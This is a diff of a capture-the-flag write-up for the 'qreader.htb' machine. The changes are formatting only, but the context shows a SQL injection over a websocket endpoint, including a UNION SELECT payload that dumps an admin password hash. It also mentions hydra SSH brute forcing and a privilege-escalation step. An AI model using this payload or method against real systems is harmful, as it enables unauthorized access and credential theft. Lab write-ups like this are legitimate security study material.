@@ -29,17 +29,17 @@ We have to add `qreader.htb` to our `/etc/hosts` file. I ran a detailed scan on 
 
 Website presents some kind of QR Code maker / reader application:
 
-<figure><img src="../../.gitbook/assets/image (1411).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1411).png>)
 
 We can actually download the application below and view the source code:
 
-<figure><img src="../../.gitbook/assets/image (2831).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2831).png>)
 
 
 
 Additionally, we can submit a report when something goes wrong:
 
-<figure><img src="../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(938).png>)
 
 Interesting. When we download the file, we will get a binary and a test image:
 
@@ -61,7 +61,6 @@ We can decompile this using `pyi-archive_viwer qreader`, and then convert it int
 
 When reading the source code, we come across this:
 
-{% code overflow="wrap" %}
 ```python
 def version(self):
     response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
@@ -75,7 +74,6 @@ def version(self):
     error = None['error']
     self.statusBar().showMessage(error)
 ```
-{% endcode %}
 
 This connects to a websocket, which is on port 5789 after running an `nmap` scan to confirm. It appears to send some information via `ws_connect` to the `/version` directory.
 
@@ -111,12 +109,10 @@ ws.close()
 
 The output is as shown:
 
-{% code overflow="wrap" %}
 ```
 $ python3 exploit.py
 {"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
 ```
-{% endcode %}
 
 I tried playing around with the version number, and it would raise an `Invalid Version!` error each time it wasn't set to `0.0.2`. When I appended a `"`, it would print nothing, indicating that there was an error in the backend since the code catches errors.
 
@@ -131,38 +127,32 @@ $ python3 exploit.py
 
 With this, we can extract the tables present in `sqlite_schema`.
 
-{% code overflow="wrap" %}
 ```
 {"message": {"id": "sqlite_sequence,versions,users,info,reports,answers", "version": 2, "released_date": 3, "downloads": 4}}
 ```
-{% endcode %}
 
 There's a `users` table, and we can try to extract a username and password from it.
 
-{% code overflow="wrap" %}
 ```
 payload used: 0.0.2"UNION SELECT username,password,3,4 from users;-- -
 {"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": 3, "downloads": 4}}
 ```
-{% endcode %}
 
 Great! The hash can be cracked on crackstation:
 
-<figure><img src="../../.gitbook/assets/image (3225).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3225).png>)
 
 Now, we need to find a username. I looked through the other tables of `reports` and `answers`.
 
-{% code overflow="wrap" %}
 ```
 {"message": {"id": "Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller,Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "version": 2, "released_date": 3, "downloads": 4}}
 ```
-{% endcode %}
 
 This was done using `group_concat(answers)`, and it seems that the user is either Mike, Thomas Keller or Json. I tested `ssh` with a wordlist of possible usernames generated from their names, and found that `tkeller` is the right user via `hydra`.
 
 We can then `ssh` in as `tkeller` and grab the user flag.
 
-<figure><img src="../../.gitbook/assets/image (4023).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4023).png>)
 
 ## Privilege Escalation
 
@@ -229,6 +219,6 @@ So this script checks for a `.spec` file extension, and takes an `$action` argum
 
 As such, the exploit is simple.
 
-<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(336).png>)
 
 Pretty straightforward machine. The hard part was the SQL injection.
